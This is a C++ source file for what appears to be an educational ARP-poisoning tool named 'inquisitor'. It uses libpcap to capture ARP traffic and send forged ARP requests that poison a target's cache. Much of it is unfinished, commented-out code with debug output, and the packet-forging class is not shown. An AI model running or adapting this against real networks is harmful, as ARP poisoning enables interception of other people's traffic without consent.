#include <iostream>
#include <pcap/pcap.h>
#include <Pcap.hpp>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <stdio.h>
#include <iomanip>
#include <csignal>
#include "ft_macros.hpp"

//a delete
//fin delete

/*
 * class {
 *
 *  store arp
 *  set arp
 *  get arp
 * }
 */

/*
 * To free ARP table
 */
int g_free_arp = 0;
/*
 * Mandatory global
 */
static Pcap *g_pcap = NULL;
pcap_t *g_device = NULL;

/*
 * 0 == normal capture
 * 1 == retrieve capture
 * 2 == breakloop
 */
void	signal_handler(int sig) {
	printf("g_free_arp:%d\n", g_free_arp);
	if (sig == SIGINT) {
		if (g_free_arp == 0) {
			g_free_arp = 1;
			if (g_device) {
				pcap_breakloop(g_device);
			}
		}
		std::cout << "STOP" << std::endl;
	}
}

void	timer_handler(int sig) {
	if (sig == SIGALRM && g_pcap) {
//		printf("s: %d\n", g_pcap->sendPacket());
	}
}

/*
 * Forge packet
 * Send packet into signal if no heap allocations
 * otherwise use thread
 * infect
 */
/*int start_poison(Pcap &c_pcap) {
	//char buf[sizeof(struct ether_header) + sizeof(ether_arp)] = {0};
	int res = c_pcap.setSelfMac();

	printf("ret: %d\n", res);
	if (res) {
		if (res == PCAP_ERROR)
			std::cerr << "No device found" << std::endl;
		printf("ret: %d", res);
		std::cout << "res error << std::endl;" << std::endl;
		return 1;
	}
//	c_pcap.forgePacketReply(false);
	printf("ret timer: %d\n", setitimer(ITIMER_REAL, &timer, NULL));
	g_pcap = &c_pcap;
	return 0;
}*/

/*
 * Source is at poison ether target ip
 */
/*int poison_reply(Pcap &c_pcap) {
	struct timeval time = {
		.tv_sec = 1,
		.tv_usec = 0
	};
	const struct itimerval timer = {
		.it_interval = time,
		.it_value = time
	};

	pcap_t *device = c_pcap.GetDeviceCapture();
	if (!device)
		return 1;
	std::signal(SIGALRM, timer_handler);
	g_pcap_t = device;
	g_pcap = &c_pcap;
	//c_pcap.forgePacketReply(false);
	printf("ret timer: %d\n", setitimer(ITIMER_REAL, &timer, NULL));
	return 0;
}
*/
/*
 * Who has target? tell poison
 */
int poison_request(Pcap &c_pcap, bool recover) {
	c_pcap.forgePacketRequest(recover);
	printf("request s: %d\n", c_pcap.sendPacket());
	c_pcap.forgePacketRequestSrc(recover);
	printf("request s: %d\n", c_pcap.sendPacket());
	return 0;
}

int loop_filter(Pcap &c_pcap) {
	std::cout << "loop filter" << std::endl;
	pcap_t *device = c_pcap.GetDeviceCapture();
	if (!device)
		return 1;
	std::cout << "loop filter apres" << std::endl;
	int res = c_pcap.setSelfMac();

	printf("ret self: %d\n", res);
	if (res) {
		if (res == PCAP_ERROR)
			std::cerr << "No device found" << std::endl;
		printf("ret: %d", res);
		std::cout << "res error << std::endl;" << std::endl;
		return 1;
	}
	std::cout<<"request act"<<std::endl;
	poison_request(c_pcap, false);
	//poison_reply(c_pcap);
	std::cout<<"reply act"<<std::endl;
	//start_poison(c_pcap);
	g_device = device;
	std::signal(SIGINT, signal_handler);
	return c_pcap.loopPcap(device);
	//loop {
	//
	//}
	//if g_free_arp == 1 > free arp after pcap_breakloop;
}

int start_capture(Pcap &c_pcap) {
	//pcap_if_t *device;
	char errbuf[PCAP_ERRBUF_SIZE] = { 0 };
	pcap_t	*device_capture = NULL;
	int	error;
	struct bpf_program *fp = NULL;

	try {
		//get arp
		/*device = c_pcap.GetDevice();
		if (!device) {
			std::cerr << "Couldn't get device" << std::endl;
			return 1;
		}*/
		c_pcap.SetDeviceCapture(c_pcap.getInterface());
		device_capture = c_pcap.GetDeviceCapture();
		if (!device_capture) {
			std::cerr << "Couldn't get device for capture." << std::endl;
			return 1;
		}
		error = c_pcap.setTimeout(device_capture, 100);
		if (error == PCAP_ERROR_ACTIVATED) {
			std::cerr << "Capture already activated." << std::endl;
			return 1;
		}
		error = c_pcap.activateCapture(device_capture);
		if (error != 0) {
			std::cerr << pcap_statustostr(error) << std::endl;
			return 1;
		}
		/*error = c_pcap.setNonBlock(errbuf, 1);
		if (error == PCAP_ERROR_NOT_ACTIVATED) {
			std::cout << "Device is not yet captured." << std::endl;
			return 1;
		}*/
		if (error == PCAP_ERROR) {
			std::cout << errbuf << std::endl;;
			return 1;
		}
		//filter ask activate before
		error = c_pcap.compileFilterArp(device_capture);
		if (error != 0) {
			pcap_perror(c_pcap.GetDeviceCapture(),
				"Compile filter failed");
			return 1;
		}
		fp = c_pcap.getBpf();
		if (!fp) {
			std::cerr << "Couldn't get Bpf." << std::endl;
			return 1;
		}
		error = c_pcap.setFilter(device_capture, fp);
		if (error != 0) {
			pcap_perror(c_pcap.GetDeviceCapture(),
				"Set filter failed");
			return 1;
		
		}
		return loop_filter(c_pcap);
	} catch (std::runtime_error& err) {
		std::cerr << "Runtime: " << err.what() << std::endl;
		return 1;
	} catch (std::bad_alloc& err) {
		std::cerr << "Bad alloc: " << err.what() << std::endl;
		return 1;
	} catch (std::exception& err) {
		std::cerr << "Exception: " << err.what() << std::endl;
		return 1;
	}
}

//./inquisitor ip_src mac_src ip_target mac_target
//get arp table
//
//
//restore arp table after ctrl+c
int main(int argc, char *argv[]) {
	/*if (argc != 5) {
		std::cout << "Please provide ./inquisitor <ip_src>" \
			<< " <MAC_src> <ip_target> <MAC_target> command." << std::endl;
	}*/
	//char errbuf[PCAP_ERRBUF_SIZE];
	//pcap_init(PCAP_CHAR_ENC_LOCAL, &errbuf);
	//if failed display err + exit
	//ppcap_create()
	//pcap_activate()
	//if fail call pcap_close()
	//get dev?
	//pcap_loop()
	//capture packets and filter arp?
	//forge it
	//pcap_sendpacket() to arp poison
	char errbuf[PCAP_ERRBUF_SIZE];
	int res = pcap_init(PCAP_CHAR_ENC_LOCAL, errbuf);

	if (res) {
		if (res == PCAP_ERROR) {
			std::cerr << errbuf << std::endl;
		}
		return 1;
	}
	std::string interface("eth0");
	if (argc == 6)
		interface = argv[5];
	std::cout<<"int:"<<interface<<std::endl;
	Pcap c_pcap(argv[1], argv[2], argv[3]
		, argv[4], interface);
	/*if (c_pcap.SetPcapList()) {
		std::cout << "[1] [2]" << std::endl;
		return start_capture(c_pcap);
	} else {
		Pcap c_pcap_2(argv[3], argv[4], argv[1], argv[2]);

		c_pcap_2.SetPcapList();
		std::cout << "[3] [4]" << std::endl;
		return start_capture(c_pcap_2);
	}*/
	res = start_capture(c_pcap);
	std::cout << "RESS:" << res << std::endl;
	//if (g_free_arp == 1) {
	//	alarm(0);
		//std::signal(SIGALRM, SIG_DFL);
		/* inverser target sur src  */
	//	poison_request(c_pcap, true);
		//c_pcap.forgePacketReply(true);
		/*std::cout << "Send 4x original ARP to target...";
		printf("s: %d\n", c_pcap.sendPacket());
		sleep(1);
		printf("s: %d\n", c_pcap.sendPacket());
		sleep(1);
		printf("s: %d\n", c_pcap.sendPacket());
		sleep(1);
		printf("s: %d\n", c_pcap.sendPacket());
		sleep(1);
		printf("s: %d\n", c_pcap.sendPacket());
	*/
	//}
	std::cout << "END"<<std::endl;
	//restore arp
	return res;
}
